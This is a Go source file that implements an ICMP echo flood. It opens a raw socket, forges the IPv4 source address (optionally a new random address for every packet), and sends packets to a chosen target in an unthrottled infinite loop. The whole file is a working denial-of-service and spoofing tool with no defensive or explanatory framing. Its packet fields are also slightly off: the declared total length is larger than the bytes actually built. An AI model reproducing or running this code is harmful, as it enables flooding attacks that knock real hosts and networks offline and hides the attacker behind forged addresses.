package main

import (
	"flag"
	"fmt"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"log"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func main() {
	const on = 1
	const IPPROTO_ICMP = 1
	var srcAddr net.IP
	var dstAddr net.IP
	var rnd bool = false
	var randIP string
	var servAddr syscall.SockaddrInet4

	srcParam := flag.String("src", "", "src addr")
	dstParam := flag.String("dst", "", "dst addr")
	flag.Parse()

	if len(*srcParam) == 0 {
		log.Fatalln("src is required param")
	}

	if len(*dstParam) == 0 {
		log.Fatalln("dst is required param")
	}

	sd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
	if err != nil {
		log.Fatalln(err)
	}

	err = syscall.SetsockoptInt(sd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, on)

	if err != nil {
		log.Fatalln(err)
	}

	err = syscall.SetsockoptInt(sd, syscall.SOL_SOCKET, syscall.SO_BROADCAST, on)

	if err != nil {
		log.Fatalln(err)
	}

	if *srcParam == "random" {
		rnd = true
		randIP := randomIP4()
		srcAddr = net.ParseIP(randIP)
	} else {
		srcAddr = net.ParseIP(*srcParam)
	}

	dstAddr = net.ParseIP(*dstParam)

	if srcAddr == nil {
		log.Fatalln("parser ip error:", *srcParam)
	}

	if dstAddr == nil {
		log.Fatalln("parser ip error:", *dstParam)
	}

	servAddr = ip2sockaddr(dstAddr.String())

	pkt := createPkt(srcAddr, dstAddr, IPPROTO_ICMP)

	for {
		fmt.Println(srcAddr, dstAddr)
		err = syscall.Sendto(sd, pkt, 0, &servAddr)
		if err != nil {
			log.Fatalln("Sendto() failed:", err)
		}

		if rnd {
			randIP = randomIP4()
			srcAddr = net.ParseIP(randIP)
			pkt = createPkt(srcAddr, dstAddr, IPPROTO_ICMP)
		}

	}
}

func createPkt(srcAddr net.IP, dstAddr net.IP, protocol int) []byte {
	/** creating package **/
	/**
	type Header struct {
		Version  int         // protocol version
		Len      int         // header length
		TOS      int         // type-of-service
		TotalLen int         // packet total length
		ID       int         // identification
		Flags    HeaderFlags // flags
		FragOff  int         // fragment offset
		TTL      int         // time-to-live
		Protocol int         // next protocol
		Checksum int         // checksum
		Src      net.IP      // source address
		Dst      net.IP      // destination address
		Options  []byte      // options, extension headers
	}
	**/

	ipHdr := ipv4.Header{
		Version:  4,
		Len:      20,
		TOS:      0,
		TotalLen: 20 + 8 + 1400,
		ID:       0,
		FragOff:  0,
		TTL:      255,
		Protocol: protocol,
		//Checksum:
		Src: srcAddr,
		Dst: dstAddr,
	}

	icmpBody := &icmp.Echo{
		ID:  1,
		Seq: 1,
	}
	icmpHdr := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		//Checksum:
		Body: icmpBody,
	}

	ipBytes, err := ipHdr.Marshal()
	if err != nil {
		log.Fatalln("ip header marshal:", err)
	}

	icmpBytes, err := icmpHdr.Marshal(nil)
	if err != nil {
		log.Fatalln("icmp header marshal:", err)
	}

	return append(ipBytes, icmpBytes...)
}

func ip2sockaddr(ip string) syscall.SockaddrInet4 {
	addr := [4]byte{}
	fmt.Sscanf(ip, "%d.%d.%d.%d", &addr[0], &addr[1], &addr[2], &addr[3])
	sockAddr := syscall.SockaddrInet4{
		Port: 0,
		Addr: addr,
	}

	return sockAddr
}

func randomIP4() string {
	rand.Seed(time.Now().UnixNano())
	blocks := []string{}
	for i := 0; i < 4; i++ {
		number := rand.Intn(255)
		blocks = append(blocks, strconv.Itoa(number))
	}

	return strings.Join(blocks, ".")
}
